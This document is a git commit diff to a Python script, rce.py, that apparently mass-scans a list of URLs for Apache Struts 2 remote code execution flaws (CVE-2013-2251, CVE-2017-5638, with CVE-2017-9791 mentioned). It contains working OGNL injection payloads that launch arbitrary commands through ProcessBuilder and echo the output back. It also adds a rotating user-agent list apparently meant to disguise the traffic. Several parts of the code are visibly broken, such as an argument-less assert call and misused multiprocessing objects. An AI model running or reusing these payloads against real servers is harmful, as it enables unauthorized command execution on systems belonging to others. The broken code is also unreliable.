ed210e2d589c91082ccc6ef442130736c7d34ab0
Robert Paul <robert.paul6@gmail.com>
2017-07-18 02:04:17 -0700

    more alpha code. Save progress

--- rce.py
+++ rce.py
@@ -7,28 +7,8 @@ import argparse
 import logging
 import requests
 import re  # normies get out
-
-
-def cve_2013_vuln(location, command):
-
-    s2_16_path = '?redirect:${#a=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletRequest\'),#b=#a.getRealPath("/"),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#b),#matt.getWriter().flush(),#matt.getWriter().close()}'
-    s2_16_payloads = (
-        '?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{PAYLOAD})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}',
-        '?redirectAction:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{PAYLOAD})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}',
-        '?action:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{PAYLOAD})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}',
-    )
-
-    raw_path = requests.get(location + quote(s2_16_path), verify=False).content.replace("\r", "").replace("\n", "")
-    command = command.replace("%RAW_PATH%", raw_path)
-    command = create_command(command)
-
-    for payload in s2_16_payloads:
-        result = post(location, quote(payload).replace("PAYLOAD", quote(command)))
-        # if not "<html" in result.lower():
-        success(str("Found path in %s" % raw_path))
-        if "65a3e764068d229ee9d62906aee6cab72f96bacc" in result:
-            logging.info("[!] %s is VULN to CVE-2013-2251" % location.strip('\n'))
-        # return result
+import sys
+import random
 
 
 def post(target, data):
@@ -54,6 +34,112 @@ def create_command(input):
     for g in input.split(' '):
         return_val += '\'%s\',' % g
     return return_val.rstrip(",")
+
+
+def getAgent():
+
+    agents = [
+        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
+        "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F",
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
+        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
+        "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
+        "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0",
+        "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0",
+        "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
+        "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
+        "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
+        "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:23.0) Gecko/20131011 Firefox/23.0",
+        "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0",
+        "Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0",
+        "Mozilla/5.0 (Microsoft Windows NT 6.2.9200.0); rv:22.0) Gecko/20130405 Firefox/22.0",
+        "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
+        "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:21.0.0) Gecko/20121011 Firefox/21.0.0",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0",
+        "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
+        "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20130514 Firefox/21.0",
+        "Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/21.0",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130331 Firefox/21.0",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130330 Firefox/21.0",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0",
+        "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0",
+        "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0",
+        "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20100101 Firefox/21.0",
+        "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130401 Firefox/21.0",
+        "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130331 Firefox/21.0",
+        "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0",
+        "Mozilla/5.0 (Windows NT 5.0; rv:21.0) Gecko/20100101 Firefox/21.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0"
+    ]
+
+    agent = random.randrange(0, (len(agents) - 1))
+    return agent
+
+
+def cve_2013_vuln(location, command):
+
+    s2_16_path = '?redirect:${#a=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletRequest\'),#b=#a.getRealPath("/"),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#b),#matt.getWriter().flush(),#matt.getWriter().close()}'
+    s2_16_payloads = (
+        '?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{PAYLOAD})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}',
+        '?redirectAction:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{PAYLOAD})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}',
+        '?action:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{PAYLOAD})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}',
+    )
+
+    raw_path = requests.get(location + quote(s2_16_path), verify=False).content.replace("\r", "").replace("\n", "")
+    command = command.replace("%RAW_PATH%", raw_path)
+    command = create_command(command)
+
+    for payload in s2_16_payloads:
+
+        assert post()
+        result = post(location, quote(payload).replace("PAYLOAD", quote(command)))
+        # if not "<html" in result.lower():
+        success(str("Found path in %s" % raw_path))
+        if "65a3e764068d229ee9d62906aee6cab72f96bacc" in result:
+            logging.info("[!] %s is VULN to CVE-2013-2251" % location.strip('\n'))
+        # return result
 
 
 def cve_2017_vuln(url, cmd):
@@ -105,14 +191,46 @@ def cve_2017_vuln(url, cmd):
 
 
 if __name__ == '__main__':
-    import sys
+
+    banner = """
+                                _.--.
+                        _.-'_:-'||
+                    _.-'_.-::::'||
+               _.-:'_.-::::::'  ||
+             .'`-.-:::::::'     ||
+            /.'`;|:::::::'      ||_
+           ||   ||::::::'     _.;._'-._
+           ||   ||:::::'  _.-!oo @.!-._'-.
+           \'.  ||:::::.-!()oo @!()@.-'_.|
+            '.'-;|:.-'.&$@.& ()$%-'o.'\U||
+              `>'-.!@%()@'@_%-'_.-o _.|'||
+               ||-._'-.@.-'_.-' _.-o  |'||
+               ||=[ '-._.-\U/.-'    o |'||
+               || '-.]=|| |'|      o  |'||
+               ||      || |'|        _| ';
+               ||      || |'|    _.-'_.-'
+               |'-._   || |'|_.-'_.-'
+                '-._'-.|| |' `_.-'
+                    '-.||_/.-'
+ _______             __                  __                              __                         
+/       \           /  |                /  |                            /  |                        
+$$$$$$$  |  ______  $$ |____    ______  $$ |        ______    ______   _$$ |_     ______    ______  
+$$ |__$$ | /      \ $$      \  /      \ $$ |       /      \  /      \ / $$   |   /      \  /      \ 
+$$    $$< /$$$$$$  |$$$$$$$  |/$$$$$$  |$$ |      /$$$$$$  |/$$$$$$  |$$$$$$/   /$$$$$$  |/$$$$$$  |
+$$$$$$$  |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |      $$ |  $$ |$$ |  $$ |  $$ | __ $$    $$ |$$ |  $$/ 
+$$ |  $$ |$$ \__$$ |$$ |__$$ |$$ \__$$ |$$ |_____ $$ \__$$ |$$ \__$$ |  $$ |/  |$$$$$$$$/ $$ |      
+$$ |  $$ |$$    $$/ $$    $$/ $$    $$/ $$       |$$    $$/ $$    $$/   $$  $$/ $$       |$$ |      
+$$/   $$/  $$$$$$/  $$$$$$$/   $$$$$$/  $$$$$$$$/  $$$$$$/   $$$$$$/     $$$$/   $$$$$$$/ $$/       
+                                                                                                    
+    """
+
+    print banner
 
     parser = argparse.ArgumentParser(prog='URL_Injection')
     parser.add_argument('-c', '--command', dest='cmd', help="Specify the command to inject", type=str, action='store')
-    parser.add_argument('-f', '--file', dest='url_list', help="Specify the list of URLs", type=str, action='store', required=True)
-    parser.add_argument('-v', '--vulncheck', dest='vulntest', help="Inject the 'id' command to URLs", action='store_true')
+    parser.add_argument('-f', '--file', dest='url_list', help="Specify the list of URLs", type=str, action='store', required=True),
     parser.add_argument('-s', '--select-cve', dest='cve_selector',
-                        help="Select the CVE ID: 0:CVE-2017-5638, 1:CVE-2013-2251", action='store_true')
+                        help="Select the CVE ID: 0:CVE-2017-5638, 1:CVE-2013-2251, 2:CVE-2017-9791", action='store_true')
     parser.add_argument('-o', '--out-file', dest='logger_output_loc',
                         help="Specify a path/filename. Default: ./output_vulnscan.log",
                         default='output_vulnscan.log',
@@ -133,24 +251,22 @@ if __name__ == '__main__':
     with open(args.url_list) as f:
         url_obj = f.readlines()
 
-    if args.vulntest == True:
+    for x in url_obj:
 
-        for x in url_obj:
+        x.strip('\n')
+        try:
 
-            x.strip('\n')
-            try:
+            logging.info("[*] Checking if %s is vulnerable" % x.strip('\n'))
+            q = multiprocessing.Queue()
+            q = multiprocessing.Pool(processes=7)
+            p = q.Process(target=cve_2017_vuln, args=(x, "echo 65a3e764068d229ee9d62906aee6cab72f96bacc"))
+            p.start()
+            #p2 = q.Process(target=cve_2013_vuln, args=(x, "echo 65a3e764068d229ee9d62906aee6cab72f96bacc"))
+            #p2.start()
 
-                logging.info("[*] Checking if %s is vulnerable" % x.strip('\n'))
-                q = multiprocessing.Queue()
-                q = multiprocessing.Pool(processes=7)
-                p = q.Process(target=cve_2017_vuln, args=(x, "echo 65a3e764068d229ee9d62906aee6cab72f96bacc"))
-                p.start()
-                #p2 = q.Process(target=cve_2013_vuln, args=(x, "echo 65a3e764068d229ee9d62906aee6cab72f96bacc"))
-                #p2.start()
+        except Exception as e:
 
-            except Exception as e:
-
-                logging.error(e)
+            logging.error(e)
 
     else:
 
